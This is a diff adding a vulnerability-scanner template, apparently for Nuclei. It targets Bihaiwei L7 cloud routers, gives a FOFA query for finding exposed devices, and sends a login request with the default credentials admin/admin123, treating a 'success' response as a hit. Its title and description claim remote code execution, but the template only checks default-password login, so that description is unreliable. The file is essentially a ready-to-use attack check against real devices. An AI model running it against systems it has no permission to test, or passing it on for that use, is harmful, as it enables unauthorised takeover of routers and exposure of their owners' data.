@@ -1,0 +1,33 @@
+id: bihaiwei-l7-weak-password-rce
+
+info:
+  name: "碧海威L7云路由认证机制缺陷与后台远程代码执行"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: product="碧海威科技-L7云路由"
+          碧海威L7云路由系统前台身份验证模块存在安全缺陷，攻击者可通过该漏洞执行任意系统命令，进而获取服务器控制权限或敏感数据，导致系统被完全控制。
+  tags: 碧海威
+
+http:
+- raw:
+  - |
+    POST /login.php?action=login&type=admin HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate, br
+    Content-Type: application/x-www-form-urlencoded
+    X-Requested-With: XMLHttpRequest
+    Connection: keep-alive
+    Cookie: SESSID=b94b5fbb56a36981366e079f0a7fda9b
+
+    username=admin&password=admin123
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'success'
